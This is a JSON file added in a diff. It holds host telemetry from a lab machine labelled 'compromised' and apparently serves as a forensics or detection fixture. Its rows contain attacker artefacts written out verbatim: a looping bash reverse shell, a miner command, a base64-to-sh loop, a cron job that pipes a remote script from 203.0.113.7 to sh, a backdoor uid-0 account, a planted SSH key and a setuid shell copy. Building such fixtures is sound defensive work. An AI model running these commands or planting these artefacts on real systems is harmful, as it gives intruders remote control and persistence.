@@ -1,0 +1,380 @@
+{
+  "client": {
+    "client_id": "compromised",
+    "os": "linux",
+    "hostname": "web-02"
+  },
+  "results": [
+    {
+      "name": "processes",
+      "rows": [
+        {
+          "cmdline": "sleep infinity",
+          "name": "sleep",
+          "on_disk": "1",
+          "parent": "0",
+          "path": "/usr/bin/sleep",
+          "pid": "1",
+          "uid": "0",
+          "username": "root"
+        },
+        {
+          "cmdline": "python3 -m http.server 8080",
+          "name": "python3",
+          "on_disk": "1",
+          "parent": "1",
+          "path": "/usr/bin/python3.12",
+          "pid": "10",
+          "uid": "0",
+          "username": "root"
+        },
+        {
+          "cmdline": "nginx: worker process",
+          "name": "nginx",
+          "on_disk": "-1",
+          "parent": "7",
+          "path": "",
+          "pid": "11",
+          "uid": "33",
+          "username": "www-data"
+        },
+        {
+          "cmdline": "nginx: worker process",
+          "name": "nginx",
+          "on_disk": "-1",
+          "parent": "7",
+          "path": "",
+          "pid": "13",
+          "uid": "33",
+          "username": "www-data"
+        },
+        {
+          "cmdline": "nginx: worker process",
+          "name": "nginx",
+          "on_disk": "-1",
+          "parent": "7",
+          "path": "",
+          "pid": "14",
+          "uid": "33",
+          "username": "www-data"
+        },
+        {
+          "cmdline": "nginx: worker process",
+          "name": "nginx",
+          "on_disk": "-1",
+          "parent": "7",
+          "path": "",
+          "pid": "15",
+          "uid": "33",
+          "username": "www-data"
+        },
+        {
+          "cmdline": "nginx: worker process",
+          "name": "nginx",
+          "on_disk": "-1",
+          "parent": "7",
+          "path": "",
+          "pid": "16",
+          "uid": "33",
+          "username": "www-data"
+        },
+        {
+          "cmdline": "nginx: worker process",
+          "name": "nginx",
+          "on_disk": "-1",
+          "parent": "7",
+          "path": "",
+          "pid": "17",
+          "uid": "33",
+          "username": "www-data"
+        },
+        {
+          "cmdline": "nginx: worker process",
+          "name": "nginx",
+          "on_disk": "-1",
+          "parent": "7",
+          "path": "",
+          "pid": "18",
+          "uid": "33",
+          "username": "www-data"
+        },
+        {
+          "cmdline": "nginx: worker process",
+          "name": "nginx",
+          "on_disk": "-1",
+          "parent": "7",
+          "path": "",
+          "pid": "19",
+          "uid": "33",
+          "username": "www-data"
+        },
+        {
+          "cmdline": "bash -c while true; do bash -i >& /dev/tcp/listener/4444 0>&1; sleep 5; done",
+          "name": "bash",
+          "on_disk": "1",
+          "parent": "1",
+          "path": "/usr/bin/bash",
+          "pid": "27",
+          "uid": "0",
+          "username": "root"
+        },
+        {
+          "cmdline": "bash -i",
+          "name": "bash",
+          "on_disk": "1",
+          "parent": "27",
+          "path": "/usr/bin/bash",
+          "pid": "29",
+          "uid": "0",
+          "username": "root"
+        },
+        {
+          "cmdline": "/bin/sh /tmp/.x/kworkerd -o stratum+tcp://pool.example.invalid:3333 -u wallet123 --donate-level 1",
+          "name": "kworkerd",
+          "on_disk": "1",
+          "parent": "1",
+          "path": "/usr/bin/dash",
+          "pid": "31",
+          "uid": "0",
+          "username": "root"
+        },
+        {
+          "cmdline": "/tmp/.updater infinity",
+          "name": ".updater",
+          "on_disk": "0",
+          "parent": "1",
+          "path": "/tmp/.updater",
+          "pid": "34",
+          "uid": "0",
+          "username": "root"
+        },
+        {
+          "cmdline": "bash -c while true; do echo c2xlZXAgNjA= | base64 -d | sh; done",
+          "name": "bash",
+          "on_disk": "1",
+          "parent": "1",
+          "path": "/usr/bin/bash",
+          "pid": "39",
+          "uid": "0",
+          "username": "root"
+        },
+        {
+          "cmdline": "python3 -m http.server 31337",
+          "name": "python3",
+          "on_disk": "1",
+          "parent": "1",
+          "path": "/usr/bin/python3.12",
+          "pid": "54",
+          "uid": "0",
+          "username": "root"
+        },
+        {
+          "cmdline": "nginx: master process nginx",
+          "name": "nginx",
+          "on_disk": "1",
+          "parent": "1",
+          "path": "/usr/sbin/nginx",
+          "pid": "7",
+          "uid": "0",
+          "username": "root"
+        },
+        {
+          "cmdline": "sleep 60",
+          "name": "sleep",
+          "on_disk": "1",
+          "parent": "31",
+          "path": "/usr/bin/sleep",
+          "pid": "74",
+          "uid": "0",
+          "username": "root"
+        },
+        {
+          "cmdline": "sh",
+          "name": "sh",
+          "on_disk": "1",
+          "parent": "39",
+          "path": "/usr/bin/dash",
+          "pid": "77",
+          "uid": "0",
+          "username": "root"
+        },
+        {
+          "cmdline": "sleep 60",
+          "name": "sleep",
+          "on_disk": "1",
+          "parent": "77",
+          "path": "/usr/bin/sleep",
+          "pid": "78",
+          "uid": "0",
+          "username": "root"
+        },
+        {
+          "cmdline": "python3 /lab/collect.py compromised",
+          "name": "python3",
+          "on_disk": "1",
+          "parent": "0",
+          "path": "/usr/bin/python3.12",
+          "pid": "79",
+          "uid": "0",
+          "username": "root"
+        },
+        {
+          "cmdline": "nginx: worker process",
+          "name": "nginx",
+          "on_disk": "-1",
+          "parent": "7",
+          "path": "",
+          "pid": "8",
+          "uid": "33",
+          "username": "www-data"
+        },
+        {
+          "cmdline": "osqueryi --json SELECT p.pid, p.parent, p.name, p.path, p.cmdline, p.uid, (SELECT username FROM users WHERE uid = p.uid LIMIT 1) AS username, p.on_disk FROM processes p",
+          "name": "osqueryi",
+          "on_disk": "1",
+          "parent": "79",
+          "path": "/opt/osquery/bin/osqueryd",
+          "pid": "84",
+          "uid": "0",
+          "username": "root"
+        },
+        {
+          "cmdline": "nginx: worker process",
+          "name": "nginx",
+          "on_disk": "-1",
+          "parent": "7",
+          "path": "",
+          "pid": "9",
+          "uid": "33",
+          "username": "www-data"
+        }
+      ]
+    },
+    {
+      "name": "network_connections",
+      "rows": [
+        {
+          "pid": "29",
+          "process_cmdline": "bash -i",
+          "process_name": "bash",
+          "remote_address": "192.168.148.2",
+          "remote_port": "4444",
+          "state": "ESTABLISHED"
+        }
+      ]
+    },
+    {
+      "name": "listening_ports",
+      "rows": [
+        {
+          "address": "0.0.0.0",
+          "pid": "7",
+          "port": "80",
+          "process_cmdline": "nginx: master process nginx",
+          "process_name": "nginx"
+        },
+        {
+          "address": "127.0.0.11",
+          "pid": "-1",
+          "port": "35625",
+          "process_cmdline": "",
+          "process_name": ""
+        },
+        {
+          "address": "0.0.0.0",
+          "pid": "10",
+          "port": "8080",
+          "process_cmdline": "python3 -m http.server 8080",
+          "process_name": "python3"
+        },
+        {
+          "address": "0.0.0.0",
+          "pid": "54",
+          "port": "31337",
+          "process_cmdline": "python3 -m http.server 31337",
+          "process_name": "python3"
+        },
+        {
+          "address": "::",
+          "pid": "7",
+          "port": "80",
+          "process_cmdline": "nginx: master process nginx",
+          "process_name": "nginx"
+        },
+        {
+          "address": "127.0.0.11",
+          "pid": "-1",
+          "port": "37540",
+          "process_cmdline": "",
+          "process_name": ""
+        }
+      ]
+    },
+    {
+      "name": "cron_jobs",
+      "rows": [
+        {
+          "command": "root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/aarch64-linux-gnu/e2fsprogs/e2scrub_all_cron",
+          "path": "/etc/cron.d/e2scrub_all"
+        },
+        {
+          "command": "root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r",
+          "path": "/etc/cron.d/e2scrub_all"
+        },
+        {
+          "command": "root curl -fsSL http://203.0.113.7/k.sh | sh",
+          "path": "/etc/cron.d/sys-update"
+        }
+      ]
+    },
+    {
+      "name": "root_users",
+      "rows": [
+        {
+          "directory": "/root",
+          "gid": "0",
+          "shell": "/bin/bash",
+          "uid": "0",
+          "username": "root"
+        },
+        {
+          "directory": "/home/sysbackup",
+          "gid": "0",
+          "shell": "/bin/bash",
+          "uid": "0",
+          "username": "sysbackup"
+        }
+      ]
+    },
+    {
+      "name": "ssh_keys",
+      "rows": [
+        {
+          "algorithm": "ssh-rsa",
+          "comment": "hacker@kali",
+          "key": "AAAAB3NzaC1yc2EAAAADAQABAAABAQDfake0nly4testingXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
+          "key_file": "/root/.ssh/authorized_keys"
+        }
+      ]
+    },
+    {
+      "name": "temp_files",
+      "rows": [
+        {
+          "mode": "0755",
+          "path": "/tmp/.x",
+          "size": "16",
+          "type": "directory",
+          "uid": "0"
+        },
+        {
+          "mode": "4755",
+          "path": "/var/tmp/.bash",
+          "size": "1543048",
+          "type": "regular",
+          "uid": "0"
+        }
+      ]
+    }
+  ]
+}
